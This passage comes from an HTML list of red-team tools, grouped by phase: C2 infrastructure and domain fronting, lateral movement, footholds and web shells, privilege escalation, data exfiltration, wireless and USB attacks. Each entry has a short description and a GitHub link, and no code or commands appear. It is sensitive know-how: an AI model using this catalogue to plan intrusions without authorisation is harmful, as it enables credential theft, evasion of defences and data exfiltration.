beacon C&amp;C. <a href="https://github.com/Mr-Un1k0d3r/CatMyFish" target="_blank" rel="noopener">https://github.com/Mr-Un1k0d3r/CatMyFish</a></li><li><strong>Malleable C2</strong> is a domain specific language to redefine indicators in Beacon’s communication. <a href="https://github.com/rsmudge/Malleable-C2-Profiles" target="_blank" rel="noopener">https://github.com/rsmudge/Malleable-C2-Profiles</a></li><li><strong>Malleable-C2-Randomizer</strong> This script randomizes Cobalt Strike Malleable C2 profiles through the use of a metalanguage, hopefully reducing the chances of flagging signature-based detection controls. <a href="https://github.com/bluscreenofjeff/Malleable-C2-Randomizer" target="_blank" rel="noopener">https://github.com/bluscreenofjeff/Malleable-C2-Randomizer</a></li><li><strong>FindFrontableDomains</strong> search for potential frontable domains. <a href="https://github.com/rvrsh3ll/FindFrontableDomains" target="_blank" rel="noopener">https://github.com/rvrsh3ll/FindFrontableDomains</a></li><li><strong>Postfix-Server-Setup</strong> Setting up a phishing server is a very long and tedious process. It can take hours to setup, and can be compromised in minutes. <a href="https://github.com/n0pe-sled/Postfix-Server-Setup" target="_blank" rel="noopener">https://github.com/n0pe-sled/Postfix-Server-Setup</a></li><li><strong>DomainFrontingLists</strong> a list of Domain Frontable Domains by CDN. <a href="https://github.com/vysec/DomainFrontingLists" target="_blank" rel="noopener">https://github.com/vysec/DomainFrontingLists</a></li><li><strong>Apache2-Mod-Rewrite-Setup</strong> Quickly Implement Mod-Rewrite in your infastructure. <a href="https://github.com/n0pe-sled/Apache2-Mod-Rewrite-Setup" target="_blank" rel="noopener">https://github.com/n0pe-sled/Apache2-Mod-Rewrite-Setup</a></li><li><strong>mod_rewrite rule</strong> to evade vendor sandboxes. <a href="https://gist.github.com/curi0usJack/971385e8334e189d93a6cb4671238b10" target="_blank" rel="noopener">https://gist.github.com/curi0usJack/971385e8334e189d93a6cb4671238b10</a></li><li><strong>external_c2 framework</strong> a python framework for usage with Cobalt Strike’s External C2. <a href="https://github.com/Und3rf10w/external_c2_framework" target="_blank" rel="noopener">https://github.com/Und3rf10w/external_c2_framework</a></li><li><strong>ExternalC2</strong> a library for integrating communication channels with the Cobalt Strike External C2 server. <a href="https://github.com/ryhanson/ExternalC2" target="_blank" rel="noopener">https://github.com/ryhanson/ExternalC2</a></li><li><strong>cs2modrewrite</strong> a tools for convert Cobalt Strike profiles to modrewrite scripts. <a href="https://github.com/threatexpress/cs2modrewrite" target="_blank" rel="noopener">https://github.com/threatexpress/cs2modrewrite</a></li><li><strong>e2modrewrite</strong> a tools for convert Empire profiles to Apache modrewrite scripts. <a href="https://github.com/infosecn1nja/e2modrewrite" target="_blank" rel="noopener">https://github.com/infosecn1nja/e2modrewrite</a></li><li><strong>redi</strong> automated script for setting up CobaltStrike redirectors (nginx reverse proxy, letsencrypt). <a href="https://github.com/taherio/redi" target="_blank" rel="noopener">https://github.com/taherio/redi</a></li><li><strong>Domain Fronting Google App Engine</strong>. <a href="https://github.com/redteam-cyberark/Google-Domain-fronting" target="_blank" rel="noopener">https://github.com/redteam-cyberark/Google-Domain-fronting</a></li><li><strong>DomainFrontDiscover</strong> Scripts and results for finding domain frontable CloudFront domains. <a href="https://github.com/peewpw/DomainFrontDiscover" target="_blank" rel="noopener">https://github.com/peewpw/DomainFrontDiscover</a></li><li><strong>Automated Empire Infrastructure</strong> <a href="https://github.com/bneg/RedTeam-Automation" target="_blank" rel="noopener">https://github.com/bneg/RedTeam-Automation</a></li><li><strong>Serving Random Payloads</strong> with NGINX. <a href="https://gist.github.com/jivoi/a33ace2e25515a31aa2ffbae246d98c9" target="_blank" rel="noopener">https://gist.github.com/jivoi/a33ace2e25515a31aa2ffbae246d98c9</a></li><li><strong>meek</strong> is a blocking-resistant pluggable transport for Tor. It encodes a<br>data stream as a sequence of HTTPS requests and responses. <a href="https://github.com/arlolra/meek" target="_blank" rel="noopener">https://github.com/arlolra/meek</a></li><li><strong>CobaltStrike-ToolKit</strong> Some useful scripts for CobaltStrike. <a href="https://github.com/killswitch-GUI/CobaltStrike-ToolKit" target="_blank" rel="noopener">https://github.com/killswitch-GUI/CobaltStrike-ToolKit</a></li><li><strong>mkhtaccess_red</strong> Auto-generate an HTaccess for payload delivery – automatically pulls ips/nets/etc from known sandbox companies/sources that have been seen before, and redirects them to a benign payload. <a href="https://github.com/violentlydave/mkhtaccess_red" target="_blank" rel="noopener">https://github.com/violentlydave/mkhtaccess_red</a></li><li><strong>RedFile</strong> a flask wsgi application that serves files with intelligence, good for serving conditional RedTeam payloads. <a href="https://github.com/outflanknl/RedFile" target="_blank" rel="noopener">https://github.com/outflanknl/RedFile</a></li><li><strong>keyserver</strong> Easily serve HTTP and DNS keys for proper payload protection. <a href="https://github.com/leoloobeek/keyserver" target="_blank" rel="noopener">https://github.com/leoloobeek/keyserver</a></li><li><strong>DoHC2</strong> allows the ExternalC2 library from Ryan Hanson (<a href="https://github.com/ryhanson/ExternalC2" target="_blank" rel="noopener">https://github.com/ryhanson/ExternalC2</a>) to be leveraged for command and control (C2) via DNS over HTTPS (DoH). This is built for the popular Adversary Simulation and Red Team Operations Software Cobalt Strike (<a href="https://www.cobaltstrike.com" target="_blank" rel="noopener">https://www.cobaltstrike.com</a>). <a href="https://github.com/SpiderLabs/DoHC2" target="_blank" rel="noopener">https://github.com/SpiderLabs/DoHC2</a></li><li><strong>cat-sites</strong> Library of sites for categorization. <a href="https://github.com/audrummer15/cat-sites" target="_blank" rel="noopener">https://github.com/audrummer15/cat-sites</a></li></ul><h2 id="Lateral-Movement"><a href="#Lateral-Movement" class="headerlink" title="Lateral Movement"></a>Lateral Movement</h2><ul><li><strong>CrackMapExec</strong> is a swiss army knife for pentesting networks. <a href="https://github.com/byt3bl33d3r/CrackMapExec" target="_blank" rel="noopener">https://github.com/byt3bl33d3r/CrackMapExec</a></li><li><strong>PowerLessShell</strong> rely on MSBuild.exe to remotely execute PowerShell scripts and commands without spawning powershell.exe. <a href="https://github.com/Mr-Un1k0d3r/PowerLessShell" target="_blank" rel="noopener">https://github.com/Mr-Un1k0d3r/PowerLessShell</a></li><li><strong>GoFetch</strong> is a tool to automatically exercise an attack plan generated by the BloodHound application.<br> <a href="https://github.com/GoFetchAD/GoFetch" target="_blank" rel="noopener">https://github.com/GoFetchAD/GoFetch</a></li><li><strong>ANGRYPUPPY</strong> a bloodhound attack path automation in CobaltStrike. <a href="https://github.com/vysec/ANGRYPUPPY" target="_blank" rel="noopener">https://github.com/vysec/ANGRYPUPPY</a></li><li><strong>DeathStar</strong> is a Python script that uses Empire’s RESTful API to automate gaining Domain Admin rights in Active Directory environments using a variety of techinques. <a href="https://github.com/byt3bl33d3r/DeathStar" target="_blank" rel="noopener">https://github.com/byt3bl33d3r/DeathStar</a></li><li><strong>SharpHound</strong> C# Rewrite of the BloodHound Ingestor. <a href="https://github.com/BloodHoundAD/SharpHound" target="_blank" rel="noopener">https://github.com/BloodHoundAD/SharpHound</a></li><li><strong>BloodHound.py</strong> is a Python based ingestor for BloodHound, based on Impacket. <a href="https://github.com/fox-it/BloodHound.py" target="_blank" rel="noopener">https://github.com/fox-it/BloodHound.py</a></li><li><strong>Responder</strong> is a LLMNR, NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication. <a href="https://github.com/SpiderLabs/Responder" target="_blank" rel="noopener">https://github.com/SpiderLabs/Responder</a></li><li><strong>SessionGopher</strong> is a PowerShell tool that uses WMI to extract saved session information for remote access tools such as WinSCP, PuTTY, SuperPuTTY, FileZilla, and Microsoft Remote Desktop. It can be run remotely or locally. <a href="https://github.com/fireeye/SessionGopher" target="_blank" rel="noopener">https://github.com/fireeye/SessionGopher</a></li><li><strong>PowerSploit</strong> is a collection of Microsoft PowerShell modules that can be used to aid penetration testers during all phases of an assessment. <a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit</a></li><li><strong>Nishang</strong> is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming. Nishang is useful during all phases of penetration testing. <a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener">https://github.com/samratashok/nishang</a></li><li><strong>Inveigh</strong> is a Windows PowerShell LLMNR/mDNS/NBNS spoofer/man-in-the-middle tool. <a href="https://github.com/Kevin-Robertson/Inveigh" target="_blank" rel="noopener">https://github.com/Kevin-Robertson/Inveigh</a></li><li><strong>PowerUpSQL</strong> a PowerShell Toolkit for Attacking SQL Server. <a href="https://github.com/NetSPI/PowerUpSQL" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL</a></li><li><strong>MailSniper</strong> is a penetration testing tool for searching through email in a Microsoft Exchange environment for specific terms (passwords, insider intel, network architecture information, etc.). <a href="https://github.com/dafthack/MailSniper" target="_blank" rel="noopener">https://github.com/dafthack/MailSniper</a></li><li><strong>WMIOps</strong> is a powershell script that uses WMI to perform a variety of actions on hosts, local or remote, within a Windows environment. It’s designed primarily for use on penetration tests or red team engagements. <a href="https://github.com/ChrisTruncer/WMIOps" target="_blank" rel="noopener">https://github.com/ChrisTruncer/WMIOps</a></li><li><strong>Mimikatz</strong> is an open-source utility that enables the viewing of credential information from the Windows lsass. <a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz</a></li><li><strong>LaZagne</strong> project is an open source application used to retrieve lots of passwords stored on a local computer. <a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noopener">https://github.com/AlessandroZ/LaZagne</a></li><li><strong>mimipenguin</strong> a tool to dump the login password from the current linux desktop user. Adapted from the idea behind the popular Windows tool mimikatz. <a href="https://github.com/huntergregal/mimipenguin" target="_blank" rel="noopener">https://github.com/huntergregal/mimipenguin</a></li><li><strong>PsExec</strong> is a light-weight telnet-replacement that lets you execute processes on other systems, complete with full interactivity for console applications, without having to manually install client software. <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/sysinternals/downloads/psexec</a></li><li><strong>KeeThief</strong> allows for the extraction of KeePass 2.X key material from memory, as well as the backdooring and enumeration of the KeePass trigger system. <a href="https://github.com/HarmJ0y/KeeThief" target="_blank" rel="noopener">https://github.com/HarmJ0y/KeeThief</a></li><li><strong>PSAttack</strong> combines some of the best projects in the infosec powershell community into a self contained custom PowerShell console. <a href="https://github.com/jaredhaight/PSAttack" target="_blank" rel="noopener">https://github.com/jaredhaight/PSAttack</a></li><li><strong>Internal Monologue Attack</strong> Retrieving NTLM Hashes without Touching LSASS. <a href="https://github.com/eladshamir/Internal-Monologue" target="_blank" rel="noopener">https://github.com/eladshamir/Internal-Monologue</a></li><li><strong>Impacket</strong> is a collection of Python classes for working with network protocols. Impacket is focused on providing low-level programmatic access to the packets and for some protocols (for instance NMB, SMB1-3 and MS-DCERPC) the protocol implementation itself. <a href="https://github.com/CoreSecurity/impacket" target="_blank" rel="noopener">https://github.com/CoreSecurity/impacket</a></li><li><strong>icebreaker</strong> gets plaintext Active Directory credentials if you’re on the internal network but outside the AD environment. <a href="https://github.com/DanMcInerney/icebreaker" target="_blank" rel="noopener">https://github.com/DanMcInerney/icebreaker</a></li><li><strong>Living Off The Land Binaries and Scripts (and now also Libraries)</strong> The goal of these lists are to document every binary, script and library that can be used for other purposes than they are designed to. <a href="https://github.com/api0cradle/LOLBAS" target="_blank" rel="noopener">https://github.com/api0cradle/LOLBAS</a></li><li><strong>WSUSpendu</strong> for compromised WSUS server to extend the compromise to clients. <a href="https://github.com/AlsidOfficial/WSUSpendu" target="_blank" rel="noopener">https://github.com/AlsidOfficial/WSUSpendu</a></li><li><strong>Evilgrade</strong> is a modular framework that allows the user to take advantage of poor upgrade implementations by injecting fake updates. <a href="https://github.com/infobyte/evilgrade" target="_blank" rel="noopener">https://github.com/infobyte/evilgrade</a></li><li><strong>NetRipper</strong> is a post exploitation tool targeting Windows systems which uses API hooking in order to intercept network traffic and encryption related functions from a low privileged user, being able to capture both plain-text traffic and encrypted traffic before encryption/after decryption. <a href="https://github.com/NytroRST/NetRipper" target="_blank" rel="noopener">https://github.com/NytroRST/NetRipper</a></li><li><strong>LethalHTA</strong> Lateral Movement technique using DCOM and HTA. <a href="https://github.com/codewhitesec/LethalHTA" target="_blank" rel="noopener">https://github.com/codewhitesec/LethalHTA</a></li><li><strong>Invoke-PowerThIEf</strong> an Internet Explorer Post Exploitation library. <a href="https://github.com/nettitude/Invoke-PowerThIEf" target="_blank" rel="noopener">https://github.com/nettitude/Invoke-PowerThIEf</a></li><li><strong>RedSnarf</strong> is a pen-testing / red-teaming tool for Windows environments. <a href="https://github.com/nccgroup/redsnarf" target="_blank" rel="noopener">https://github.com/nccgroup/redsnarf</a></li><li><strong>HoneypotBuster</strong> Microsoft PowerShell module designed for red teams that can be used to find honeypots and honeytokens in the network or at the host. <a href="https://github.com/JavelinNetworks/HoneypotBuster" target="_blank" rel="noopener">https://github.com/JavelinNetworks/HoneypotBuster</a></li></ul><h2 id="Establish-Foothold"><a href="#Establish-Foothold" class="headerlink" title="Establish Foothold"></a>Establish Foothold</h2><ul><li><strong>Tunna</strong> is a set of tools which will wrap and tunnel any TCP communication over HTTP. It can be used to bypass network restrictions in fully firewalled environments. <a href="https://github.com/SECFORCE/Tunna" target="_blank" rel="noopener">https://github.com/SECFORCE/Tunna</a></li><li><strong>reGeorg</strong> the successor to reDuh, pwn a bastion webserver and create SOCKS proxies through the DMZ. Pivot and pwn. <a href="https://github.com/sensepost/reGeorg" target="_blank" rel="noopener">https://github.com/sensepost/reGeorg</a></li><li><strong>Blade</strong> is a webshell connection tool based on console, currently under development and aims to be a choice of replacement of Chooper. <a href="https://github.com/wonderqs/Blade" target="_blank" rel="noopener">https://github.com/wonderqs/Blade</a></li><li><strong>TinyShell</strong> Web Shell Framework. <a href="https://github.com/threatexpress/tinyshell" target="_blank" rel="noopener">https://github.com/threatexpress/tinyshell</a></li><li><strong>PowerLurk</strong> is a PowerShell toolset for building malicious WMI Event Subsriptions. <a href="https://github.com/Sw4mpf0x/PowerLurk" target="_blank" rel="noopener">https://github.com/Sw4mpf0x/PowerLurk</a></li><li><strong>DAMP</strong> The Discretionary ACL Modification Project: Persistence Through Host-based Security Descriptor Modification.<br><a href="https://github.com/HarmJ0y/DAMP" target="_blank" rel="noopener">https://github.com/HarmJ0y/DAMP</a></li></ul><h2 id="Escalate-Privileges"><a href="#Escalate-Privileges" class="headerlink" title="Escalate Privileges"></a>Escalate Privileges</h2><h3 id="Domain-Escalation"><a href="#Domain-Escalation" class="headerlink" title="Domain Escalation"></a>Domain Escalation</h3><ul><li><strong>PowerView</strong> is a PowerShell tool to gain network situational awareness on Windows domains. <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</a></li><li><strong>Get-GPPPassword</strong> Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences. <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1</a></li><li><strong>Invoke-ACLpwn</strong> is a tool that automates the discovery and pwnage of ACLs in Active Directory that are unsafe configured. <a href="https://github.com/fox-it/Invoke-ACLPwn" target="_blank" rel="noopener">https://github.com/fox-it/Invoke-ACLPwn</a></li><li><strong>BloodHound</strong> uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment. <a href="https://github.com/BloodHoundAD/BloodHound" target="_blank" rel="noopener">https://github.com/BloodHoundAD/BloodHound</a></li><li><strong>PyKEK</strong> (Python Kerberos Exploitation Kit), a python library to manipulate KRB5-related data. <a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek" target="_blank" rel="noopener">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek</a></li><li><strong>Grouper</strong> a PowerShell script for helping to find vulnerable settings in AD Group Policy.<br><a href="https://github.com/l0ss/Grouper" target="_blank" rel="noopener">https://github.com/l0ss/Grouper</a></li><li><strong>ADRecon</strong> is a tool which extracts various artifacts (as highlighted below) out of an AD environment in a specially formatted Microsoft Excel report that includes summary views with metrics to facilitate analysis. <a href="https://github.com/sense-of-security/ADRecon" target="_blank" rel="noopener">https://github.com/sense-of-security/ADRecon</a></li><li><strong>ADACLScanner</strong> one script for ACL’s in Active Directory. <a href="https://github.com/canix1/ADACLScanner" target="_blank" rel="noopener">https://github.com/canix1/ADACLScanner</a></li><li><strong>LAPSToolkit</strong> a tool to audit and attack LAPS environments. <a href="https://github.com/leoloobeek/LAPSToolkit" target="_blank" rel="noopener">https://github.com/leoloobeek/LAPSToolkit</a></li><li><strong>PingCastle</strong> is a free, Windows-based utility to audit the risk level of your AD infrastructure and check for vulnerable practices. <a href="https://www.pingcastle.com/download" target="_blank" rel="noopener">https://www.pingcastle.com/download</a></li><li><strong>RiskySPNs</strong> is a collection of PowerShell scripts focused on detecting and abusing accounts associated with SPNs (Service Principal Name). <a href="https://github.com/cyberark/RiskySPN" target="_blank" rel="noopener">https://github.com/cyberark/RiskySPN</a></li><li><strong>Mystique</strong> is a PowerShell tool to play with Kerberos S4U extensions, this module can assist blue teams to identify risky Kerberos delegation configurations as well as red teams to impersonate arbitrary users by leveraging KCD with Protocol Transition. <a href="https://github.com/machosec/Mystique" target="_blank" rel="noopener">https://github.com/machosec/Mystique</a></li><li><strong>Rubeus</strong> is a C# toolset for raw Kerberos interaction and abuses. It is heavily adapted from Benjamin Delpy’s Kekeo project. <a href="https://github.com/GhostPack/Rubeus" target="_blank" rel="noopener">https://github.com/GhostPack/Rubeus</a></li><li><strong>kekeo</strong> is a little toolbox I have started to manipulate Microsoft Kerberos in C (and for fun). <a href="https://github.com/gentilkiwi/kekeo" target="_blank" rel="noopener">https://github.com/gentilkiwi/kekeo</a></li></ul><h3 id="Local-Escalation"><a href="#Local-Escalation" class="headerlink" title="Local Escalation"></a>Local Escalation</h3><ul><li><strong>UACMe</strong> is an open source assessment tool that contains many methods for bypassing Windows User Account Control on multiple versions of the operating system. <a href="https://github.com/hfiref0x/UACME" target="_blank" rel="noopener">https://github.com/hfiref0x/UACME</a></li><li><strong>windows-kernel-exploits</strong> a collection windows kernel exploit. <a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/windows-kernel-exploits</a></li><li><strong>PowerUp</strong> aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations. <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1</a></li><li><strong>The Elevate Kit</strong> demonstrates how to use third-party privilege escalation attacks with Cobalt Strike’s Beacon payload. <a href="https://github.com/rsmudge/ElevateKit" target="_blank" rel="noopener">https://github.com/rsmudge/ElevateKit</a></li><li><strong>Sherlock</strong> a powerShell script to quickly find missing software patches for local privilege escalation vulnerabilities.<br> <a href="https://github.com/rasta-mouse/Sherlock" target="_blank" rel="noopener">https://github.com/rasta-mouse/Sherlock</a></li><li><strong>Tokenvator</strong> a tool to elevate privilege with Windows Tokens. <a href="https://github.com/0xbadjuju/Tokenvator" target="_blank" rel="noopener">https://github.com/0xbadjuju/Tokenvator</a></li></ul><h2 id="Data-Exfiltration"><a href="#Data-Exfiltration" class="headerlink" title="Data Exfiltration"></a>Data Exfiltration</h2><ul><li><strong>CloakifyFactory</strong> &amp; the Cloakify Toolset - Data Exfiltration &amp; Infiltration In Plain Sight; Evade DLP/MLS Devices; Social Engineering of Analysts; Defeat Data Whitelisting Controls; Evade AV Detection. <a href="https://github.com/TryCatchHCF/Cloakify" target="_blank" rel="noopener">https://github.com/TryCatchHCF/Cloakify</a></li><li><strong>DET</strong> (is provided AS IS), is a proof of concept to perform Data Exfiltration using either single or multiple channel(s) at the same time. <a href="https://github.com/sensepost/DET" target="_blank" rel="noopener">https://github.com/sensepost/DET</a></li><li><strong>DNSExfiltrator</strong> allows for transfering (exfiltrate) a file over a DNS request covert channel. This is basically a data leak testing tool allowing to exfiltrate data over a covert channel. <a href="https://github.com/Arno0x/DNSExfiltrator" target="_blank" rel="noopener">https://github.com/Arno0x/DNSExfiltrator</a></li><li><strong>PyExfil</strong> a Python Package for Data Exfiltration. <a href="https://github.com/ytisf/PyExfil" target="_blank" rel="noopener">https://github.com/ytisf/PyExfil</a></li><li><strong>Egress-Assess</strong> is a tool used to test egress data detection capabilities. <a href="https://github.com/ChrisTruncer/Egress-Assess" target="_blank" rel="noopener">https://github.com/ChrisTruncer/Egress-Assess</a></li><li><strong>Powershell RAT</strong> python based backdoor that uses Gmail to exfiltrate data as an e-mail attachment. <a href="https://github.com/Viralmaniar/Powershell-RAT" target="_blank" rel="noopener">https://github.com/Viralmaniar/Powershell-RAT</a></li></ul><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Wireless-Networks"><a href="#Wireless-Networks" class="headerlink" title="Wireless Networks"></a>Wireless Networks</h3><ul><li><strong>Wifiphisher</strong> is a security tool that performs Wi-Fi automatic association attacks to force wireless clients to unknowingly connect to an attacker-controlled Access Point. <a href="https://github.com/wifiphisher/wifiphisher" target="_blank" rel="noopener">https://github.com/wifiphisher/wifiphisher</a></li><li><strong>Evilginx</strong> is a man-in-the-middle attack framework used for phishing credentials and session cookies of any web service. <a href="https://github.com/kgretzky/evilginx" target="_blank" rel="noopener">https://github.com/kgretzky/evilginx</a></li><li><strong>mana</strong> toolkit for wifi rogue AP attacks and MitM. <a href="https://github.com/sensepost/mana" target="_blank" rel="noopener">https://github.com/sensepost/mana</a></li></ul><h3 id="Embedded-amp-Peripheral-Devices-Hacking"><a href="#Embedded-amp-Peripheral-Devices-Hacking" class="headerlink" title="Embedded &amp; Peripheral Devices Hacking"></a>Embedded &amp; Peripheral Devices Hacking</h3><ul><li><strong>magspoof</strong> a portable device that can spoof/emulate any magnetic stripe, credit card or hotel card “wirelessly”, even on standard magstripe (non-NFC/RFID) readers. <a href="https://github.com/samyk/magspoof" target="_blank" rel="noopener">https://github.com/samyk/magspoof</a></li><li><strong>WarBerryPi</strong> was built to be used as a hardware implant during red teaming scenarios where we want to obtain as much information as possible in a short period of time with being as stealth as possible. <a href="https://github.com/secgroundzero/warberry" target="_blank" rel="noopener">https://github.com/secgroundzero/warberry</a></li><li><strong>P4wnP1</strong> is a highly customizable USB attack platform, based on a low cost Raspberry Pi Zero or Raspberry Pi Zero W (required for HID backdoor). <a href="https://github.com/mame82/P4wnP1" target="_blank" rel="noopener">https://github.com/mame82/P4wnP1</a></li><li><strong>malusb</strong> HID spoofing multi-OS payload for Teensy. <a href="https://github.com/ebursztein/malusb" target="_blank" rel="noopener">https://github.com/ebursztein/malusb</a></li><li><strong>Fenrir</strong> is a tool designed to be used “out-of-the-box” for penetration tests and offensive engagements. Its main feature and purpose is to bypass wired 802.1x protection and to give you an access to the target network. <a href="https://github.com/Orange-Cyberdefense/fenrir-ocd" target="_blank" rel="noopener">https://github.com/Orange-Cyberdefense/fenrir-ocd</a></li><li><strong>poisontap</strong> exploits locked/password protected computers over USB, drops persistent WebSocket-based backdoor, exposes internal router, and siphons cookies using Raspberry Pi Zero &amp; Node.js. <a href="https://github.com/samyk/poisontap" target="_blank" rel="noopener">https://github.com/samyk/poisontap</a></li><li><strong>WHID</strong> WiFi HID Injector - An USB Rubberducky / BadUSB On Steroids.<br><a href="https://github.com/whid-injector/WHID" target="_blank" rel="noopener">https://github.com/whid-injector/WHID</a></li></ul><h3 id="Software-For-Team-Communication"><a href="#Software-For-Team-Communication" class="headerlink" title="Software For Team Communication"></a>Software For Team Communication</h3><ul><li><strong>RocketChat</strong> is free, unlimited and open source. Replace email &amp; Slack with the ultimate team chat software solution. <a href="https://rocket.chat" target="_blank" rel="noopener">https://rocket.chat</a></li><li><strong>Etherpad</strong> is an open source, web-based collaborative real-time editor, allowing authors to simultaneously edit a text document <a href="https://etherpad.net" target="_blank" rel="noopener">https://etherpad.net</a></li></ul><h3 id="Log-Aggregation"><a href="#Log-Aggregation" class="headerlink" title="Log Aggregation"></a>Log Aggregation</h3><ul><li><strong>RedELK</strong> Red Team’s SIEM - easy deployable tool for Red Teams used for tracking and alarming about Blue Team activities as well as better usability in long term operations. <a href="https://github.com/outflanknl/RedELK/" target="_blank" rel="noopener">https://github.com/outflanknl/RedELK/</a></li><li><strong>CobaltSplunk</strong> Splunk Dashboard for CobaltStrike logs. <a href="https://github.com/vysec/CobaltSplunk" target="_blank" rel="noopener">https://github.com/vysec/CobaltSplunk</a></li><li><strong>Red Team Telemetry</strong> A collection of scripts and configurations to enable centralized logging of red team infrastructure. <a href="https://github.com/ztgrace/red_team_telemetry" target="_blank" rel="noopener">https://github.com/ztgrace/red_team_telemetry</a></li><li><strong>Elastic for Red Teaming</strong> Repository of resources for configuring a Red Team SIEM using Elastic. <a href="https://github.com/SecurityRiskAdvisors/RedTeamSIEM" target="_blank" rel="noopener">https://github.com/SecurityRiskAdvisors/RedTeamSIEM</a></li></ul><h3 id="C-Offensive-Framework"><a href="#C-Offensive-Framework" class="headerlink" title="C# Offensive Framework"></a>C# Offensive Framework</h3><ul><li><strong>SharpSploit</strong> is a .NET post-exploitation library written in C# that aims to highlight the attack surface of .NET and make the use of offensive .NET easier for red teamers. <a href="https://github.com/cobbr/SharpSploit" target="_blank" rel="noopener">https://github.com/cobbr/SharpSploit</a></li><li><strong>GhostPack</strong> is (currently) a collection various C# implementations of previous PowerShell functionality, and includes six separate toolsets being released today- Seatbelt, SharpUp, SharpRoast, SharpDump, SafetyKatz, and SharpWMI. <a href="https://github.com/GhostPack" target="_blank" rel="noopener">https://github.com/GhostPack</a></li><li><strong>SharpWeb</strong> .NET 2.0 CLR project to retrieve saved browser credentials from Google Chrome, Mozilla Firefox and Microsoft Internet Explorer/Edge. <a href="https://github.com/djhohnstein/SharpWeb" target="_blank" rel="noopener">https://github.com/djhohnstein/SharpWeb</a></li><li><strong>reconerator</strong> C# Targeted Attack Reconnissance Tools. <a href="https://github.com/stufus/reconerator" target="_blank" rel="noopener">https://github.com/stufus/reconerator</a></li><li><strong>SharpView</strong> C# implementation of harmj0y’s PowerView. <a href="https://github.com/tevora-threat/SharpView" target="_blank" rel="noopener">https://github.com/tevora-threat/SharpView</a></li><li><strong>Watson</strong> is a (.NET 2.0 compliant) C# implementation of Sherlock. <a href="https://github.com/rasta-mouse/Watson" target="_blank" rel="noopener">https://github.com/rasta-mouse/Watson</a></li></ul><h3 id="Labs"><a href="#Labs" class="headerlink" title="Labs"></a>Labs</h3><ul><li><strong>Detection Lab</strong> This lab has been designed with defenders in mind. Its primary purpose is to allow the user to quickly build a Windows domain that comes pre-loaded with security tooling and some best practices when it comes to system logging configurations. <a href="https://github.com/clong/DetectionLab" target="_blank" rel="noopener">https://github.com/clong/DetectionLab</a></li><li><strong>Modern Windows Attacks and Defense Lab</strong> This is the lab configuration for the Modern Windows Attacks and Defense class that Sean Metcalf (@pyrotek3) and I teach. <a href="https://github.com/jaredhaight/WindowsAttackAndDefenseLab" target="_blank" rel="noopener">https://github.com/jaredhaight/WindowsAttackAndDefenseLab</a></li><li><strong>Invoke-UserSimulator</strong> Simulates common user behaviour on local and remote Windows hosts. <a href="https://github.com/ubeeri/Invoke-UserSimulator" target="_blank" rel="noopener">https://github.com/ubeeri/Invoke-UserSimulator</a></li><li><strong>Invoke-ADLabDeployer</strong> Automated deployment of Windows and Active Directory test lab networks. Useful for red and blue teams. <a href="https://github.com/outflanknl/Invoke-ADLabDeployer" target="_blank" rel="noopener">https://github.com/outflanknl/Invoke-ADLabDeployer</a></li><li><strong>Sheepl</strong> Creating realistic user behaviour for supporting tradecraft development within lab environments. <a href="https://github.com/SpiderLabs/sheepl" target="_blank" rel="noopener">https://github.com/SpiderLabs/sheepl</a></li></ul><h3 id="Scripts"><a href="#Scripts" class="headerlink" title="Scripts"></a>Scripts</h3><ul><li><p><strong>Aggressor Scripts</strong> is a scripting language for red team operations and adversary simulations inspired by scriptable IRC clients and bots.</p><ul><li><a href="https://github.com/invokethreatguy/CSASC" target="_blank" rel="noopener">https://github.com/invokethreatguy/CSASC</a></li><li><a href="https://github.com/secgroundzero/CS-Aggressor-Scripts" target="_blank" rel="noopener">https://github.com/secgroundzero/CS-Aggressor-Scripts</a></li><li><a href="https://github.com/Und3rf10w/Aggressor-scripts" target="_blank" rel="noopener">https://github.com/Und3rf10w/Aggressor-scripts</a></li><li><a href="https://github.com/harleyQu1nn/AggressorScripts" target="_blank" rel="noopener">https://github.com/harleyQu1nn/AggressorScripts</a></li><li><a href="https://github.com/rasta-mouse/Aggressor-Script" target="_blank" rel="noopener">https://github.com/rasta-mouse/Aggressor-Script</a></li><li><a href="https://github.com/RhinoSecurityLabs/Aggressor-Scripts" target="_blank" rel="noopener">https://github.com/RhinoSecurityLabs/Aggressor-Scripts</a></li><li><a href="https://github.com/bluscreenofjeff/AggressorScripts" target="_blank" rel="noopener">https://github.com/bluscreenofjeff/AggressorScripts</a></li><li><a href="https://github.com/001SPARTaN/aggressor_scripts" target="_blank" rel="noopener">https://github.com/001SPARTaN/aggressor_scripts</a></li><li><a href="https://github.com/360-A-Team/CobaltStrike-Toolset" target="_blank" rel="noopener">https://github.com/360-A-Team/CobaltStrike-Toolset</a></li></ul></li><li><p>A collection scripts useful for red teaming and pentesting</p><ul><li><a 